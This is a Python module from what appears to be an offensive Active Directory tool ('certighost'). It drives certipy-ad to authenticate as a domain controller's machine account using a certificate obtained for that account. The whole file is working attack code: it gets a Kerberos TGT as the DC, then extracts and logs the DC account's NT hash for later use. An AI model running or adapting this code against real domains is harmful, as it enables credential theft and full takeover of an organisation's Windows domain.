"""
Kerberos authentication module -- authenticate as DC via certificate (PKINIT).

Uses certipy-ad auth for PKINIT: PFX -> TGT (ccache).
"""

import logging
import os
import re
import shutil
import subprocess

logger = logging.getLogger("certighost.kerberos_auth")


async def authenticate_as_dc(
    cert_info: dict,
    private_key,
    domain: str,
    dc_ip: str,
    target_dc: str = None,
    output_file: str = "dc.ccache",
) -> dict:
    """
    PKINIT authentication via certipy-ad auth.

    Args:
        cert_info: dict from enroll_certificate_chase (must contain pfx_path)
        private_key: unused (certipy reads from PFX), kept for interface compat
        domain: AD domain name
        dc_ip: Domain Controller IP
        target_dc: DC FQDN (for DNS resolution)
        output_file: ccache output path

    Returns:
        dict with: ccache_file, principal, domain, dc_ip, nt_hash
    """
    from dns_utils import ensure_dc_resolves

    pfx_path = cert_info.get("pfx_path")
    if not pfx_path or not os.path.exists(pfx_path):
        raise RuntimeError(f"PFX file not found: {pfx_path}")

    dc_fqdn = target_dc or f"DC01.{domain}"
    ensure_dc_resolves(dc_fqdn, dc_ip)

    # certipy-ad expects sAMAccountName (DC01$), not FQDN (DC01.cqure.lab)
    dns_name = cert_info.get("dns", "DC01")
    sam_name = dns_name.split(".")[0] + "$"

    cmd = [
        "certipy-ad", "auth",
        "-pfx", pfx_path,
        "-dc-ip", dc_ip,
        "-username", sam_name,
        "-domain", domain,
    ]

    logger.info(f"PKINIT: {cert_info.get('dns', '?')}@{domain} -> {dc_ip}")
    logger.info(f"  PFX: {pfx_path}")

    # Remove stale ccache files so we never mistake an old one for fresh output
    for stale in [output_file, f"{dns_name.split('.')[0].lower()}.ccache"]:
        if os.path.exists(stale):
            os.remove(stale)
            logger.debug(f"Removed stale ccache: {stale}")

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=60,
        )
    except FileNotFoundError:
        raise RuntimeError("certipy-ad not found. Install with: pip install certipy-ad")
    except subprocess.TimeoutExpired:
        raise RuntimeError("certipy-ad auth timed out after 60 seconds")

    output = result.stdout + result.stderr
    logger.debug(f"certipy-ad auth output:\n{output}")

    if result.returncode != 0 and "Got TGT" not in output:
        raise RuntimeError(f"certipy-ad auth failed: {output}")

    # Parse output for ccache path and NT hash
    ccache_path = None
    nt_hash = None

    for line in output.splitlines():
        if "Saved credential cache to" in line:
            match = re.search(r"Saved credential cache to '([^']+)'", line)
            if match:
                ccache_path = match.group(1)
        if "got hash for" in line.lower() or "nt hash" in line.lower():
            match = re.search(r"([a-fA-F0-9]{32}):([a-fA-F0-9]{32})", line)
            if match:
                nt_hash = match.group(2)

    if not ccache_path:
        default_ccache = f"{dns_name.split('.')[0].lower()}.ccache"
        if os.path.exists(default_ccache):
            ccache_path = default_ccache

    if ccache_path and ccache_path != output_file:
        shutil.move(ccache_path, output_file)
        logger.info(f"Moved ccache: {ccache_path} -> {output_file}")
        ccache_path = output_file

    if not ccache_path and not os.path.exists(output_file):
        raise RuntimeError(
            f"certipy-ad auth did not produce a ccache file. Output: {output}"
        )

    logger.info(f"TGT saved to {output_file}")
    if nt_hash:
        logger.info(f"NT hash: {nt_hash}")

    return {
        "ccache_file": output_file,
        "principal": cert_info.get("dns", "DC01$"),
        "domain": domain,
        "dc_ip": dc_ip,
        "nt_hash": nt_hash,
        "certificate": cert_info,
    }
